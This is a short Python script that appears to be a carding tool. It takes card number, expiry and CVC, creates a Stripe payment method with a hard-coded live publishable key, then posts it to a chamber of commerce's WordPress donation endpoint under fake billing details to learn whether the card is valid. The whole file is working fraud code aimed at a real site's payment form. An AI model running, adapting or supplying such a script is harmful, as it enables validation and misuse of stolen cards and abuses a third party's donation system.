import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 4)
	random_amount2 = random.randint(1, 99)

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=Gen+Paypal&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fdda83de495%3B+stripe-js-v3%2Fdda83de495%3B+card-element&key=pk_live_51IHAKHL6qXoZf0q29lYxHyPHZJNFSiu4rIZYLu2SkX2udCs8pRAj2ERKv0Zd19qvd3tdVjK2T5wgAewUdnj31Acp00lDEO8pxL'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'www.miamibeachchamber.com',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://www.miamibeachchamber.com',
	    'referer': 'https://www.miamibeachchamber.com/education-foundation/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'wp_full_stripe_inline_donation_charge',
	    'wpfs-form-name': 'EducationFoundationDonationTeacherGrants',
	    'wpfs-form-get-parameters': '%7B%7D',
	    'wpfs-custom-amount': 'other',
	    'wpfs-custom-amount-unique': '1',
	    'wpfs-donation-frequency': 'one-time',
	    'wpfs-custom-input[]': '',
	    'wpfs-billing-name': 'Gen Paypal',
	    'wpfs-billing-address-country': 'US',
	    'wpfs-billing-address-line-1': '27 Allen St',
	    'wpfs-billing-address-line-2': '',
	    'wpfs-billing-address-city': 'New York',
	    'wpfs-billing-address-state': '',
	    'wpfs-billing-address-state-select': 'NY',
	    'wpfs-billing-address-zip': '10002',
	    'wpfs-card-holder-email': 'genpaypal01@gmail.com',
	    'wpfs-card-holder-name': 'Gen Paypal',
	    'wpfs-stripe-payment-method-id': f'{pm}',
	}
	
	response = requests.post('https://www.miamibeachchamber.com/wp-admin/admin-ajax.php', headers=headers, data=data)
	
	result = response.json()['message']
	
	return result
